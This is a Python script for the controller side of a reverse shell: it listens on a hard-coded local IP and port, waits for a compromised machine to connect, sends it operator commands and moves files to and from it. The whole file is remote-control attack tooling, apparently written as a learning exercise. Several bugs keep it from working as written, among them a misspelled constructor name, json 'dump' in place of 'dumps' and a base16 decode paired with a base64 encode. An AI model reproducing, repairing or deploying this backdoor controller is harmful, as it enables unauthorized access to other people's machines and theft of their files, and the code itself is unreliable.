import simplejson
import socket
import base64
class SocketListener:
    def __int__(self,ip,port):
        my_listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        my_listener.bind((ip,port))

        my_listener.listen(0)
        print("Listening to entering your adress")

        (self.my_connection,my_adress)=my_listener.accept()
        print(f"Connection is Succesfully from {str(my_adress)}")

    def json_send(self,data):
        jason_data=simplejson.dump(data)
        self.my_connection.send(jason_data.encode("utf-8"))

    def json_get(self):
        jason_data=""
        while True:
            try:
                jason_data = jason_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(jason_data)
            except ValueError:
                continue

    def command_run(self,enter_command):
        self.json_send(enter_command)
        if enter_command[0] == "EXİT" or enter_command[0] == "QUİT":
            self.my_connection.close()
            exit()
        return self.json_get()

    def save_file_download_command(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b16decode(content))
            return "Download OK"

    def send_file_download_command(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
    def start_listening(self):
        while True:
            enter_command=input("ENTER YOUR COMMAND : ")
            enter_command=enter_command.split(" ")
            try:
                if enter_command[0]=="upload" and len(enter_command) > 1:
                    file_content=self.send_file_download_command(enter_command[1])
                    enter_command.append(file_content)

                output_command=self.command_run(enter_command)

                if enter_command[0] == "download" and len(enter_command) > 1:
                    output_command = self.save_file_download_command(enter_command[1],output_command)
            except Exception:
                output_command="Error !"

            print(output_command)

my_socket_listener=SocketListener("192.168.1.106",8080)
my_socket_listener.start_listening()